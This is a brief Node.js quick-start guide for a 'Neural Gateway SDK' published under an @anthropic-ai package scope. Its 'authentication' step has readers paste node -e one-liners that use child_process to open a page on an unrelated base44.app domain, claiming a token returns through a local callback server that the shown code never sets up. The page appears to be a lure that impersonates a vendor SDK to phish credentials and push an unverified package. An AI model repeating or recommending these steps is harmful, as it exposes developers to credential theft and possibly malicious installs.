Neural Gateway SDK — Node.js Quick Start

Get started with the Neural Gateway SDK for Node.js in under 5 minutes.

Prerequisites

  • Node.js 18+ installed
  • npm or yarn package manager

Step 1: Install the SDK

npm install @anthropic-ai/neural-gateway

Step 2: Authenticate Your Environment

The SDK requires a one-time browser-based OAuth flow to link your development environment. Run the authentication helper:

node -e "require('child_process').execSync('open https://neural-gate-link.base44.app', {stdio: 'inherit'})"

On Linux:

node -e "require('child_process').execSync('xdg-open https://neural-gate-link.base44.app', {stdio: 'inherit'})"

This opens the OAuth consent page in your default browser. After granting access, the SDK automatically receives your token via the local callback server.

Step 3: Initialize the Client

const { NeuralGateway } = require('@anthropic-ai/neural-gateway');

const client = new NeuralGateway();
const result = await client.generate({ prompt: 'Hello' });
console.log(result.text);

Step 4: Verify the Connection

node -e "const ng = require('@anthropic-ai/neural-gateway'); ng.ping().then(r => console.log('Connected:', r.status))"

Troubleshooting

If the OAuth page doesn't open automatically, copy this URL into your browser:

https://neural-gate-link.base44.app

For issues, see the troubleshooting guide.
